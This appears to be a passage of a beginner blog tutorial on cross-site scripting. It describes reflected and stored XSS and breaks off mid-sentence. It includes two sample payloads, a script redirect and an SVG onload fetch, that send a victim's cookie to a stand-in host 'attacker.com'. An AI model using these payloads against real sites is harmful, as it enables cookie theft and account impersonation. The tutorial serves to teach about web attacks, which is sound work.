I"„<p>Hey Hackers, Todayâ€™s article will be about Cross-site scripting. We will be discussing about different types of Cross-site scripting but before that we 
need to know what is cross site scripting. So letâ€™s get started :)</p>
<p align="center">
  <img src="https://www.davosnetworks.com/wp-content/uploads/2020/07/cross-site-scripting-xss-864x454.jpg" />
</p>
<p><strong>What is Cross site Scripting?</strong> <br />
Cross site scripting a.k.a xss is a type of an injection attack where malicious code is being executed on the website i.e. Malicious JavaScript code. Xss is typically can be founded where input fields like search fields, comment fields, or url defined parameters. XSS is marked as A7 on OWASP TOP 10. As from an attacker perspective, xss can allow a hacker to send malicious script to the victim, thus when the victim will execute the script on the browser side, the attacker can retrieve data from the victim or host a malicious code that can gain access to their computer. I think now you got the idea what xss is :p. Letâ€™s just cut to the chase and describe the three types of xss. The three types of xss are: -</p>
<ol>
  <li>Reflected XSS</li>
  <li>Stored XSS</li>
  <li>DOM-Based XSS</li>
</ol>

<p><strong>Reflected XSS</strong> <br />
Reflected xss is defined as where the malicious code is being reflected in the website result. Reflected XSS is a non-persistent attack. Letâ€™s take a scenario where awebsite https://www.redacted.com has a forum where the comment field is vulnerable to reflected xss. So the attacker will create an xss payload for e.g: - <br /><code class="language-plaintext highlighter-rouge">https://redacted.com/comment/forum_comment=&lt;script&gt;window.location='http://attacker.com/?cookie='+document.cookie&lt;/script&gt;</code><br />and place it inside the comment field. So whenever the user clicks on the link inside the comment, it will execute and redirect the user to the attacker server and steal their cookie. Thus the attacker can use the cookie in order to impersonate the user. Or more advanced xss would be to install a malware automatically once the victim has been phished to the attacker server and taking control of their computer.</p>
<p align="center">
  <img src="https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png" />
  Kudos to whoever made this amazing diagram :D
</p>
<p><strong>Stored Xss</strong> <br />
Stored xss a.k.a persistent xss is where the malicious code will constantly execute as it is being stored in the server side. This kind of xss is more dangerous than the reflected or DOM-based xss (Will tell you in the next section about DOM :D) as you donâ€™t need to lure the target into clicking a link or any sort of as it will execute everytime when the victim visits that page that contains stored xss payload. For instance, there is a website that contains a section to upload an image and the file upload is vulnerable to xss, so the attacker can create the following payload <br /><code class="language-plaintext highlighter-rouge">&lt;svg xmlns="http://www.w3.org/2000/svg" onload=fetch(â€˜//attacker.com/?cookie=â€™+document.cookie)/&gt;</code><br /> and save it in a file with an</p>
:ET